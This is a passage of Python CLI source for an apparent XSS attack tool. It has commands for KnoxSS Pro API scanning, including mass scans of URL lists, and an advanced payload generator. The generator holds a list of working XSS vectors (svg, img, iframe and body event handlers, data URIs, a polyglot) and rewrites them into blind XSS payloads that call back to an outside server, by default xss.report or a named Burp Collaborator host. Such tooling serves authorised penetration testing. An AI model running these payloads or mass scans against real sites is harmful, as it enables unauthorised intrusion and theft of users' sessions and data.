    if analysis["suggested_modifications"]:
        click.echo(f"\n💡 Suggested modifications:")
        for suggestion in analysis["suggested_modifications"]:
            click.echo(f"    • {suggestion}")


@cli.command("pattern-report")
def pattern_report_cmd():
    """Generate comprehensive pattern report."""
    from .advanced_patterns import AdvancedPatternEngine

    click.echo(f"{Fore.CYAN}📊 Pattern System Report{Style.RESET_ALL}")
    click.echo("=" * 50)

    engine = AdvancedPatternEngine()
    report = engine.generate_pattern_report()

    click.echo(f"\n📈 Statistics:")
    click.echo(f"  Total Patterns: {report['total_patterns']}")
    click.echo(f"  Active Patterns: {report['active_patterns']}")

    click.echo(f"\n🎯 Pattern Types:")
    for ptype, count in report["pattern_types"].items():
        click.echo(f"  {ptype}: {count} patterns")

    click.echo(f"\n🛡️  WAF Coverage:")
    for waf, count in sorted(report["waf_coverage"].items()):
        click.echo(f"  {waf}: {count} patterns")

    click.echo(f"\n⭐ Priority Distribution:")
    for priority, count in sorted(
        report["priority_distribution"].items(), reverse=True
    ):
        click.echo(f"  Priority {priority}: {count} patterns")


@cli.command("knoxss-config")
def knoxss_config_command():
    """Check KnoxSS Pro API configuration status."""
    from .knoxss_integration import knoxss_config_status

    click.echo(f"{Fore.BLUE}🔐 KnoxSS Pro Configuration{Style.RESET_ALL}")
    click.echo("=" * 50)

    knoxss_config_status()


@cli.command("knoxss-payloads")
def knoxss_payloads_command():
    """Generate personalized KnoxSS Blind XSS payloads."""
    from .knoxss_integration import generate_personalized_payloads

    click.echo(f"{Fore.BLUE}🧬 KnoxSS Personal Payloads{Style.RESET_ALL}")
    click.echo("=" * 50)

    generate_personalized_payloads()


@cli.command("knoxss-scan")
@click.argument("url")
@click.option("--post-data", help="POST data for the request")
@click.option("--auth", help="Authentication (e.g., Cookie:PHPSESSID=abc)")
@click.option("--afb", is_flag=True, help="Enable AFB (Anti-Filter Bypass) mode")
@click.option(
    "--flash", is_flag=True, help="Flash mode (URL must contain [XSS] marker)"
)
@click.option("--poc", help="Submit PoC feedback for improvement")
@click.option("--checkpoc", is_flag=True, help="Validate PoC feature")
def knoxss_scan_command(url, post_data, auth, afb, flash, poc, checkpoc):
    """Scan URL using KnoxSS Pro API."""
    import asyncio
    from .knoxss_integration import knoxss_scan_target

    click.echo(f"{Fore.BLUE}🔍 KnoxSS Pro API Scanner{Style.RESET_ALL}")
    click.echo("=" * 50)

    kwargs = {}
    if post_data:
        kwargs["post_data"] = post_data
    if auth:
        kwargs["auth"] = auth
    if afb:
        kwargs["afb"] = True
    if poc:
        kwargs["poc"] = poc
    if checkpoc:
        kwargs["checkpoc"] = True

    if flash and "[XSS]" not in url:
        click.echo(
            f"{Fore.YELLOW}⚠️  Flash mode requires [XSS] marker in URL{Style.RESET_ALL}"
        )
        return

    try:
        result = asyncio.run(knoxss_scan_target(url, **kwargs))

        if result and result.xss_found:
            click.echo(
                f"\n{Fore.GREEN}🎉 XSS vulnerability confirmed by KnoxSS Pro!{Style.RESET_ALL}"
            )
        elif result:
            click.echo(f"\n{Fore.BLUE}✅ Target appears clean{Style.RESET_ALL}")
        else:
            click.echo(f"\n{Fore.RED}❌ Scan failed{Style.RESET_ALL}")

    except Exception as e:
        click.echo(f"{Fore.RED}❌ KnoxSS scan error: {e}{Style.RESET_ALL}")


@cli.command("knoxss-mass")
@click.argument("file_path")
@click.option("--delay", default=1.0, help="Delay between requests (seconds)")
def knoxss_mass_command(file_path, delay):
    """Mass scan URLs from file using KnoxSS Pro API."""
    import asyncio
    from .knoxss_integration import knoxss_mass_scan

    click.echo(f"{Fore.BLUE}📊 KnoxSS Mass Scanner{Style.RESET_ALL}")
    click.echo("=" * 50)

    try:
        results = asyncio.run(knoxss_mass_scan(file_path, delay))

        if results:
            found_count = sum(1 for r in results if r.xss_found)
            click.echo(f"\n{Fore.GREEN}📈 Mass scan completed:{Style.RESET_ALL}")
            click.echo(f"   Total scanned: {len(results)}")
            click.echo(f"   XSS found: {found_count}")
            click.echo(f"   Clean: {len(results) - found_count}")

    except Exception as e:
        click.echo(f"{Fore.RED}❌ Mass scan error: {e}{Style.RESET_ALL}")


@cli.command("advanced-payload")
@click.option(
    "--type",
    "payload_type",
    type=click.Choice(["svg", "img", "iframe", "body", "data-uri", "polyglot", "all"]),
    default="all",
    help="Type of advanced payload to generate",
)
@click.option(
    "--context",
    type=click.Choice(
        ["html_text", "attr_double", "attr_single", "js_string", "url_param"]
    ),
    default="html_text",
    help="Injection context for payload adaptation",
)
@click.option(
    "--blind-server",
    default="https://xss.report/c/terafos",
    help="Blind XSS callback server",
)
@click.option(
    "--colab",
    is_flag=True,
    help="Use Burp Collaborator (817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com)",
)
@click.option(
    "--variants", type=int, default=10, help="Number of variants per payload type"
)
@click.option("--save", help="Save results to file")
def advanced_payload_cmd(payload_type, context, blind_server, colab, variants, save):
    """Generate advanced XSS payloads beyond basic <script> tags (robota feature #2)."""

    # Determine blind server
    if colab:
        blind_server = "https://817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com"

    click.echo(f"{Fore.CYAN}🚀 Advanced Payload Generator{Style.RESET_ALL}")
    click.echo(f"{Fore.BLUE}📋 Type: {payload_type.upper()}{Style.RESET_ALL}")
    click.echo(f"{Fore.BLUE}🎯 Context: {context}{Style.RESET_ALL}")
    click.echo(f"{Fore.MAGENTA}🔗 Blind Server: {blind_server}{Style.RESET_ALL}")
    if colab:
        click.echo(f"{Fore.YELLOW}🤝 Using Burp Collaborator{Style.RESET_ALL}")
    click.echo()

    try:
        # Advanced payload templates
        payload_templates = {
            "svg": [
                "<svg/onload=alert(1)>",
                "<svg onload=alert(1)>",
                "<svg/onload='alert(1)'>",
                '<svg onload="alert(1)">',
                "<svg><animateTransform onbegin=alert(1)>",
                "<svg><set onbegin=alert(1)>",
                "<svg><animate onbegin=alert(1)>",
                "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            ],
            "img": [
                "<img src=x onerror=alert(1)>",
                "<img src='x' onerror='alert(1)'>",
                '<img src="x" onerror="alert(1)">',
                "<img/src=x/onerror=alert(1)>",
                "<img src onerror=alert(1)>",
                "<img src=# onerror=alert(1)>",
                "<img src=x onLoad=alert(1)>",
                "<img src=x onmouseover=alert(1)>",
            ],
            "iframe": [
                '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
                '<iframe src="javascript:alert(1)"></iframe>',
                "<iframe src=javascript:alert(1)></iframe>",
                "<iframe onload=alert(1)></iframe>",
                "<iframe/onload=alert(1)></iframe>",
                '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
            ],
            "body": [
                "<body onload=alert(1)>",
                "<body/onload=alert(1)>",
                "<body onload='alert(1)'>",
                '<body onload="alert(1)">',
                "<body onpageshow=alert(1)>",
                "<body onhashchange=alert(1)>",
                "<body onfocus=alert(1)>",
            ],
            "data-uri": [
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                "data:text/html,<script>alert(1)</script>",
                "data:text/html;charset=utf-8,<script>alert(1)</script>",
                "data:text/javascript,alert(1)",
                "data:application/javascript,alert(1)",
                "data:image/svg+xml,<svg/onload=alert(1)>",
            ],
            "polyglot": [
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "'\"><img src=x onerror=alert(1)>",
                '";alert(1);//',
                "</script><svg/onload=alert(1)>",
                "'-alert(1)-'",
                '"-alert(1)-"',
            ],
        }

        def adapt_to_context(payload, ctx):
            """Adapt payload to specific injection context."""
            if ctx == "attr_double":
                return (
                    payload.replace('"', "&quot;")
                    .replace("<", "&lt;")
                    .replace(">", "&gt;")
                )
            elif ctx == "attr_single":
                return (
                    payload.replace("'", "&#39;")
                    .replace("<", "&lt;")
                    .replace(">", "&gt;")
                )
            elif ctx == "js_string":
                return (
                    payload.replace("<", "\\u003C")
                    .replace(">", "\\u003E")
                    .replace('"', '\\"')
                )
            elif ctx == "url_param":
                import urllib.parse

                return urllib.parse.quote(payload)
            return payload

        def make_blind(payload, server):
            """Convert payload to blind XSS."""
            blind_callback = f"new Image().src='{server}'"
            return payload.replace("alert(1)", blind_callback)

        results = []

        if payload_type == "all":
            types_to_generate = ["svg", "img", "iframe", "body", "data-uri", "polyglot"]
        else:
            types_to_generate = [payload_type]

        for ptype in types_to_generate:
            click.echo(f"{Fore.GREEN}=== {ptype.upper()} VECTORS ==={Style.RESET_ALL}")

            templates = payload_templates.get(ptype, [])
            count = 0

            for template in templates[:variants]:
                count += 1

                # Make blind XSS version
                blind_payload = make_blind(template, blind_server)

                # Adapt to context
                adapted_payload = adapt_to_context(blind_payload, context)

                click.echo(f"{Fore.CYAN}Vector {count}:{Style.RESET_ALL}")
                click.echo(f"  Original: {template}")
                click.echo(f"  Blind: {blind_payload}")
                click.echo(f"  Context ({context}): {adapted_payload}")
                click.echo()

                results.append(
                    {
                        "type": ptype,
                        "vector": count,
                        "original": template,
                        "blind": blind_payload,
                        "context_adapted": adapted_payload,
                        "context": context,
                        "blind_server": blind_server,
                    }
                )

        # Save results if requested
        if save:
            import json

            output_data = {
                "type": payload_type,
                "context": context,
                "blind_server": blind_server,
                "generated_at": "2025-07-27",
                "payloads": results,
            }

            with open(save, "w") as f:
                json.dump(output_data, f, indent=2)
            click.echo(
                f"{Fore.GREEN}✅ Advanced payloads saved to {save}{Style.RESET_ALL}"
            )

        # Summary
        click.echo(f"\n{Fore.CYAN}📊 Generation Summary:{Style.RESET_ALL}")
        click.echo(f"  Generated: {len(results)} advanced payloads")
        click.echo(f"  Types: {', '.join(types_to_generate)}")
        click.echo(f"  Context: {context}")
        click.echo(f"  Blind Server: {blind_server}")

    except Exception as e:
        click.echo(
            f"{Fore.RED}❌ Advanced payload generation failed: {e}{Style.RESET_ALL}"
        )


def main():
    """Main entry point."""
    try:
        cli()
    except KeyboardInterrupt:
        click.echo(f"\n{Fore.YELLOW}⚠️  Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        click.echo(f"{Fore.RED}❌ Error: {e}{Style.RESET_ALL}", err=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
